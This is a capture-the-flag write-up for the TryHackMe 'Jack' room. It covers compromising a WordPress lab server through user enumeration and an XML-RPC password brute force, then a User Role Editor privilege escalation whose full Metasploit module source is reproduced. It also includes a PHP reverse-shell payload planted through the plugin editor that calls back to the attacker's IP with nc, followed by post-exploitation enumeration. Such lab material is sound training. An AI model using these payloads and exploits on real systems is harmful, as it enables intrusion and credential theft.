---
Compromise a web server running Wordpress, obtain a low privileged user and escalate your privileges to root using a Python module.
---

# Jack — Writeup

## Overview
### Jack — Writeup
### Jack — Writeup
![](https://i.imgur.com/SRmSCVZ.png)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/2437ebb70c56f4c55cfe6c2851ed1551.png)

## Privilege Escalation
Start Machine
Connect to our network and deploy this machine.
Add jack.thm to /etc/hosts
Answer the questions below
```rb
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.73.143 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.73.143:22
Open 10.10.73.143:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 12:15 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:15
Completed Parallel DNS resolution of 1 host. at 12:15, 0.03s elapsed
DNS resolution of 1 IPs took 0.09s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:15
Scanning 10.10.73.143 [2 ports]
Discovered open port 80/tcp on 10.10.73.143
Discovered open port 22/tcp on 10.10.73.143
Completed Connect Scan at 12:15, 0.21s elapsed (2 total ports)
Initiating Service scan at 12:15
Scanning 2 services on 10.10.73.143
Completed Service scan at 12:15, 6.57s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.73.143.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 8.99s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 1.27s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
Nmap scan report for 10.10.73.143
Host is up, received user-set (0.21s latency).
Scanned at 2023-01-18 12:15:16 EST for 17s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e7978089331d0837fe2bcb614bf5d9b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgHGMuutSoQktLWJfDa8F4+zCvINuPv8+mL2sHPJmSfFDaQ3jlsxitYWH7FWdj3zPzXLW01aY+AySXW593T3XZpzCSAjm3ImnPtNTaQsbsdkgmhj8eZ3q9hPxU5UD5593K+/FDdIiN5xIBLegm6y0SAd3sRtpdrcpHpkqOIZvoCyJTV7ncbRY0gppvfTEObo2PiCtzh31gbaDPrJICPnDuuF5aWAUTeUMc0YcMYaB9cCvfVT6Y1Cdfh4IwMHslafXRhRt5tn5l47xR0xwd3cddUEez/CHxiNthNTgv+BSo+TPPciPAiCN3QGSqTcPQ74RvFiAznL2irkENq+Qws2A3
|   256 3a679faf7e66fae3f8c754496338a293 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzJknVQsubSrZMKNLlNAP1HXXuXzhtAf24ScY17eIS03NfxjFwiSESz8xKwVcmbODQGc+b9PvepngTTGlVrMf4=
|   256 8cef55b023732c14094522ac84cb40d2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG/WxvJRsI0dvT84mxR/y3AH3C8KP/1Njv4wP6DylZeQ
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Jack&#039;s Personal Site &#8211; Blog for Jacks writing adven...
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-generator: WordPress 5.3.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.92 seconds
```
```rb
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts      
[sudo] password for kali:
```
```rb
┌──(kali㉿kali)-[~]
└─$ tail /etc/hosts
10.10.20.190 windcorp.thm
10.10.148.212 fire.windcorp.thm
10.10.85.102 selfservice.windcorp.thm
10.10.85.102 selfservice.dev.windcorp.thm
10.10.167.117 team.thm
10.10.167.117 dev.team.thm
10.10.29.100 set.windcorp.thm
10.10.20.190 Osiris.windcorp.thm Osiris osiris.windcorp.thm
10.10.37.31  UNATCO
10.10.73.143 jack.thm
```
```rb
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://jack.thm -e ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://jack.thm/ [10.10.73.143]
[+] Started: Wed Jan 18 12:19:20 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://jack.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://jack.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>

[+] WordPress theme in use: online-portfolio
 | Location: http://jack.thm/wp-content/themes/online-portfolio/
 | Last Updated: 2021-07-30T00:00:00.000Z
 | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
 | [!] The version is out of date, the latest version is 0.1.0
 | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
 | Style Name: Online Portfolio
 | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
 | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
 | Author: Ample Themes
 | Author URI: https://amplethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jan 18 12:19:48 2023
[+] Requests Done: 40
[+] Cached Requests: 7
[+] Data Sent: 8.662 KB
[+] Data Received: 12.343 MB
[+] Memory used: 234.227 MB
[+] Elapsed time: 00:00:28
```
```rb
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://jack.thm -e u 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://jack.thm/ [10.10.73.143]
[+] Started: Wed Jan 18 12:20:23 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://jack.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://jack.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>

[+] WordPress theme in use: online-portfolio
 | Location: http://jack.thm/wp-content/themes/online-portfolio/
 | Last Updated: 2021-07-30T00:00:00.000Z
 | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
 | [!] The version is out of date, the latest version is 0.1.0
 | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
 | Style Name: Online Portfolio
 | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
 | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
 | Author: Ample Themes
 | Author URI: https://amplethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <============================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jan 18 12:20:38 2023
[+] Requests Done: 30
[+] Cached Requests: 38
[+] Data Sent: 7.527 KB
[+] Data Received: 230.207 KB
[+] Memory used: 197.637 MB
[+] Elapsed time: 00:00:14

jack, wendy, danny
```
```rb
┌──(kali㉿kali)-[~]
└─$ cat users_jack 
jack
wendy
danny

https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt
```
```rb
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://jack.thm -U users_jack -P /usr/share/wordlists/fasttrack.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://jack.thm/ [10.10.73.143]
[+] Started: Wed Jan 18 12:35:19 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://jack.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://jack.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>

[+] WordPress theme in use: online-portfolio
 | Location: http://jack.thm/wp-content/themes/online-portfolio/
 | Last Updated: 2021-07-30T00:00:00.000Z
 | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
 | [!] The version is out of date, the latest version is 0.1.0
 | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
 | Style Name: Online Portfolio
 | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
 | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
 | Author: Ample Themes
 | Author URI: https://amplethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:10 <===========================================================> (137 / 137) 100.00% Time: 00:00:10

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - wendy / changelater                                                                                                           
Trying danny / starwars Time: 00:01:17 <==============================================                 > (646 / 868) 74.42%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: wendy, Password: changelater

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jan 18 12:37:11 2023
[+] Requests Done: 818
[+] Cached Requests: 7
[+] Data Sent: 371.288 KB
[+] Data Received: 610.033 KB
[+] Memory used: 252.492 MB
[+] Elapsed time: 00:01:52

wendy: changelater

jack.thm/wp-admin

----
using terminator (shortcuts)

ctrl + shift+ d (open vertically / derecha)
ctrl + shift + a (open horizontally / abajo)
ctrl + shift + w (close terminal)
ctrl + shift + tab (move previous terminal)
ctrl + tab (move next terminal)
windows + arrow up (expand terminal)
ctrl + shift + left arrow, right arrow, down arrow, up arrow (adjust terminal)
ctrl + shift + t (open a new tab)
ctrl + shift + i (open a new terminal)

---
```
```rb
┌──(kali㉿kali)-[~]
└─$ searchsploit wordpress role privilege
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
WordPress Plugin User Role Editor < 4.25 - Privileg | php/webapps/44595.rb
---------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
```rb
┌──(kali㉿kali)-[~]
└─$ searchsploit -m php/webapps/44595.rb 
  Exploit: WordPress Plugin User Role Editor < 4.25 - Privilege Escalation
      URL: https://www.exploit-db.com/exploits/44595
     Path: /usr/share/exploitdb/exploits/php/webapps/44595.rb
    Codes: N/A
 Verified: False
File Type: Ruby script, ASCII text, with very long lines (987)
Copied to: /home/kali/44595.rb
```
```rb
┌──(kali㉿kali)-[~]
└─$ cat 44595.rb     
##
```
```rb
# This module requires Metasploit: https://metasploit.com/download
```
```rb
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress User Role Editor Plugin Privilege Escalation',
      'Description'     => %q{
        The WordPress User Role Editor plugin prior to v4.25, is lacking an authorization
        check within its update user profile functionality ("update" function, contained
        within the "class-user-other-roles.php" module).
        Instead of verifying whether the current user has the right to edit other users'
        profiles ("edit_users" WP capability), the vulnerable function verifies whether the
        current user has the rights to edit the user ("edit_user" WP function) specified by
        the supplied user id ("user_id" variable/HTTP POST parameter). Since the supplied
        user id is the current user's id, this check is always bypassed (i.e. the current
        user is always allowed to modify its profile).
        This vulnerability allows an authenticated user to add arbitrary User Role Editor
        roles to its profile, by specifying them via the "ure_other_roles" parameter within
        the HTTP POST request to the "profile.php" module (issued when "Update Profile" is
        clicked).
        By default, this module grants the specified WP user all administrative privileges,
        existing within the context of the User Role Editor plugin.
      },
      'Author'          =>
        [
          'ethicalhack3r',    # Vulnerability discovery
          'Tomislav Paskalev' # Exploit development, metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['WPVDB', '8432'],
          ['URL', 'https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/']
	],
      'DisclosureDate'  => 'Apr 05 2016',
    ))

    register_options(
      [
        OptString.new('TARGETURI',   [true, 'URI path to WordPress', '/']),
        OptString.new('ADMINPATH',   [true, 'wp-admin directory', 'wp-admin/']),
        OptString.new('CONTENTPATH', [true, 'wp-content directory', 'wp-content/']),
        OptString.new('PLUGINSPATH', [true, 'wp plugins directory', 'plugins/']),
        OptString.new('PLUGINPATH',  [true, 'User Role Editor directory', 'user-role-editor/']),
        OptString.new('USERNAME',    [true, 'WordPress username']),
        OptString.new('PASSWORD',    [true, 'WordPress password']),
	OptString.new('PRIVILEGES',  [true, 'Desired User Role Editor privileges', 'activate_plugins,delete_others_pages,delete_others_posts,delete_pages,delete_posts,delete_private_pages,delete_private_posts,delete_published_pages,delete_published_posts,edit_dashboard,edit_others_pages,edit_others_posts,edit_pages,edit_posts,edit_private_pages,edit_private_posts,edit_published_pages,edit_published_posts,edit_theme_options,export,import,list_users,manage_categories,manage_links,manage_options,moderate_comments,promote_users,publish_pages,publish_posts,read_private_pages,read_private_posts,read,remove_users,switch_themes,upload_files,customize,delete_site,create_users,delete_plugins,delete_themes,delete_users,edit_plugins,edit_themes,edit_users,install_plugins,install_themes,unfiltered_html,unfiltered_upload,update_core,update_plugins,update_themes,ure_create_capabilities,ure_create_roles,ure_delete_capabilities,ure_delete_roles,ure_edit_roles,ure_manage_options,ure_reset_roles'])
      ])
  end
```
```rb
# Detect the vulnerable plugin by enumerating its readme.txt file
  def check
    readmes = ['readme.txt', 'Readme.txt', 'README.txt']

    res = nil
    readmes.each do |readme_name|
      readme_url = normalize_uri(target_uri.path, datastore['CONTENTPATH'], datastore['PLUGINSPATH'], datastore['PLUGINPATH'], readme_name)
      vprint_status("Checking #{readme_url}")
      res = send_request_cgi(
        'uri'    => readme_url,
        'method' => 'GET'
      )
      break if res && res.code == 200
    end

    if res.nil? || res.code != 200
```
```rb
# The readme.txt file does not exist
      return Msf::Exploit::CheckCode::Unknown
    end

    version_res = extract_and_check_version(res.body.to_s, :readme, 'plugin', '4.25', nil)
    return version_res
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end
```
```rb
# Search for specified data within the provided HTTP response
  def check_response(res, name, regex)
    res.body =~ regex
    result = $1
    if result
      print_good("#{peer} - WordPress - Getting data   - #{name}")
    else
      vprint_error("#{peer} #{res.body}")
      fail_with("#{peer} - WordPress - Getting data   - Failed (#{name})")
    end
    return result
  end
```
```rb
# Run the exploit
  def run
```
```rb
# Check if the specified target is running WordPress
    fail_with("#{peer} - WordPress - Not Found") unless wordpress_and_online?
```
```rb
# Authenticate to WordPress
    print_status("#{peer} - WordPress - Authentication - #{username}:#{password}")
    cookie = wordpress_login(username, password)
    fail_with("#{peer} - WordPress - Authentication - Failed") if cookie.nil?
    store_valid_credential(user: username, private: password, proof: cookie)
    print_good("#{peer} - WordPress - Authentication - OK")
```
```rb
# Get additional information from WordPress, required for the HTTP POST request (anti-CSRF tokens, user parameters)
    url = normalize_uri(wordpress_url_backend, 'profile.php')
    print_status("#{peer} - WordPress - Getting data   - #{url}")
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => url,
      'cookie'   => cookie
    })

    if res and res.code == 200
      wp_nonce     = check_response(res, "_wpnonce",     /name=\"_wpnonce\" value=\"(.+?(?=\"))\"/)
      color_nonce  = check_response(res, "color-nonce",  /name=\"color-nonce\" value=\"(.+?(?=\"))\"/)
      checkuser_id = check_response(res, "checkuser_id", /name=\"checkuser_id\" value=\"(.+?(?=\"))\"/)
      nickname     = check_response(res, "nickname",     /name=\"nickname\" id=\"nickname\" value=\"(.+?(?=\"))\"/)
      display_name = check_response(res, "display_name", /name=\"display_name\" id=\"display_name\"\>[\s]+\<option  selected=\'selected\'\>(.+?(?=\<))\</)
      email        = check_response(res, "email",        /name=\"email\" id=\"email\" value=\"(.+?(?=\"))\"/)
      user_id      = check_response(res, "user_id",      /name=\"user_id\" id=\"user_id\" value=\"(.+?(?=\"))\"/)
    else
      fail_with("#{peer} - WordPress - Getting data   - Server response (code #{res.code})")
    end
```
```rb
# Send HTTP POST request - update the specified user's privileges
    print_status("#{peer} - WordPress - Changing privs - #{username}")
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => url,
      'vars_post' => {
        '_wpnonce'         => wp_nonce,
        '_wp_http_referer' => URI::encode(url),
        'from'             => 'profile',
        'checkuser_id'     => checkuser_id,
        'color-nonce'      => color_nonce,
        'admin_color'      => 'fresh',
        'admin_bar_front'  => '1',
        'first_name'       => '',
        'last_name'        => '',
        'nickname'         => nickname,
        'display_name'     => display_name,
        'email'            => email,
        'url'              => '',
        'description'      => '',
        'pass1'            => '',
        'pass2'            => '',
        'ure_other_roles'  => datastore['PRIVILEGES'],
        'action'           => 'update',
        'user_id'          => user_id,
        'submit'           => 'Update+Profile'
      },
      'cookie'    => cookie
    })
```
```rb
# check outcome
    if res and res.code == 302
      print_good("#{peer} - WordPress - Changing privs - OK")
    else
      fail_with("#{peer} - WordPress - Changing privs - Server response (code #{res.code})")
    end
  end
end
```
```rb
# EoF   

go to profile and press update profile then use burp
&ure_other_roles=administrator

pass2=&ure_other_roles=administrator&action=update

go to editor plugin
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f")?>
then
activate akismet plugin
```
```rb
┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337                                     
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.73.143.
Ncat: Connection from 10.10.73.143:38888.
bash: cannot set terminal process group (1184): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jack:/var/www/html/wp-admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
</wp-admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'                   
www-data@jack:/var/www/html/wp-admin$ 
zsh: suspended  rlwrap nc -lvnp 1337
```
```rb
┌──(kali㉿kali)-[~/Downloads]
└─$ stty raw -echo; fg        
[1]  + continued  rlwrap nc -lvnp 1337
www-data@jack:/var/www/html/wp-admin$ export TERM=xterm256-color
export TERM=xterm256-color
www-data@jack:/var/www/html/wp-admin$ cd /home
cd /home
www-data@jack:/home$ ls
ls
jack
www-data@jack:/home$ cd jack
cd jack
www-data@jack:/home/jack$ ls -lah
ls -lah
total 36K
drwxr-xr-x 4 jack jack 4.0K Jan 10  2020 .
drwxr-xr-x 3 root root 4.0K Jan  8  2020 ..
lrwxrwxrwx 1 jack jack    9 Jan 10  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jack jack  220 Jan  8  2020 .bash_logout
-rw-r--r-- 1 jack jack 3.7K Jan  8  2020 .bashrc
drwx------ 2 jack jack 4.0K Jan  9  2020 .cache
-rw-r--r-- 1 jack jack  655 Jan  8  2020 .profile
drwx------ 2 jack jack 4.0K Jan 10  2020 .ssh
-rw-r--r-- 1 root root  140 Jan 10  2020 reminder.txt
-rw-rw-r-- 1 jack jack   33 Jan 10  2020 user.txt
www-data@jack:/home/jack$ cat user.txt
cat user.txt
0052f7829e48752f2e7bf50f1231548a

www-data@jack:/home/jack$ cat reminder.txt
cat reminder.txt

Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.

www-data@jack:/home/jack$ cd .ssh
cd .ssh
bash: cd: .ssh: Permission denied

www-data@jack:/home/jack$ locate backups
locate backups
/var/backups
/var/backups/alternatives.tar.0
/var/backups/apt.extended_states.0
/var/backups/apt.extended_states.1.gz
/var/backups/dpkg.arch.0
/var/backups/dpkg.arch.1.gz
/var/backups/dpkg.diversions.0
/var/backups/dpkg.diversions.1.gz
/var/backups/dpkg.statoverride.0
/var/backups/dpkg.statoverride.1.gz
/var/backups/dpkg.status.0
/var/backups/dpkg.status.1.gz
/var/backups/group.bak
/var/backups/gshadow.bak
/var/backups/passwd.bak
/var/backups/shadow.bak
www-data@jack:/home/jack$ cd /var/backups
cd /var/backups
www-data@jack:/var/backups$ ls
ls
alternatives.tar.0	  dpkg.diversions.1.gz	  gshadow.bak
apt.extended_states.0	  dpkg.statoverride.0	  id_rsa
apt.extended_states.1.gz  dpkg.statoverride.1.gz  passwd.bak
dpkg.arch.0		  dpkg.status.0		  shadow.bak
dpkg.arch.1.gz		  dpkg.status.1.gz
dpkg.diversions.0	  group.bak
